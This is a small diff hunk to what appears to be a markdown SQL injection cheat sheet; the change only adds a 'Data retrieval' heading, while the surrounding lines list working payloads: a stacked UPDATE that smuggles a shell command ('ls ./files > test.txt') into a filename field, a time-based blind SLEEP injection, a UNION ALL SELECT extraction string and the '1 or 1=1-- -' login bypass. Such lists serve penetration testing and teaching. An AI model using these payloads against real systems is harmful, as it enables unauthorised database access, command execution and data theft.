@@ -51,6 +51,7 @@ id=3;update photos set filename="*|| ls ./files > test.txt" where id =3;commit; 
 %' AND (SELECT 9598 FROM (SELECT(SLEEP(5)))bJqR) AND 'FKXA%'='FKXA
 %' UNION ALL SELECT 1,2,3,CONCAT(0x716b7a7a71,0x6a4a7143494e46596b6d4c4c6569725a475572687178746d55434b687861796371705952614c7857,0x7176786271),NULL-- -
 ```
+### Data retrieval
 ### Determinig SQLi Vulnerablity & Login Bypass
 ```sql
 1 or 1=1-- -
